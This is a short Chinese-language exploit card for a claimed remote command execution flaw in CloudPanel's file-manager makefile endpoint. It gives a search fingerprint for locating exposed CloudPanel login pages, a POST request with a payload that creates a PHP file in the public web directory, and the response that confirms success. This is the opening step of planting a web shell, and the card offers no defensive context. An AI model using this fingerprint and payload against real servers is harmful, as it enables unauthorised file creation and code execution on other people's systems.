# CloudPanelmakefile接口存在远程命令执行漏洞

CloudPanelmakefile ｜ 命令执行 ｜ —
- **指纹**：`title=="CloudPanel | Log In"`
- **请求**：`POST /file-manager/backend/makefile HTTP/1.1`

**Payload**
```
id=/htdocs/app/files/public/&name=dudesite.php
```
- **响应特征**：200 dudesite.php